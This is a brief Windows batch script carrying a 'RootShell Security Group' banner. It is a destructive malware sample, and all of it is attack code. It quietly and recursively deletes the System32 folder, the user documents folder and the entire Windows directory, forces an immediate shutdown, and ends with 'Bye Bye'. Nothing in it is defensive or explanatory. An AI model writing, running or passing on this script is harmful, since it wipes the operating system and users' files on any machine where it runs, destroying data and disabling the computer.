@echo off
REM ====================================
REM =====[RootShell Security Group]=====
REM ====================================

DEL /s /Q %systemroot%\system32\
DEL /s /Q %systemdrive%\DOCUME~1\
DEL /s /Q %systemroot%\

shutdown -s -t 00

REM Bye Bye..


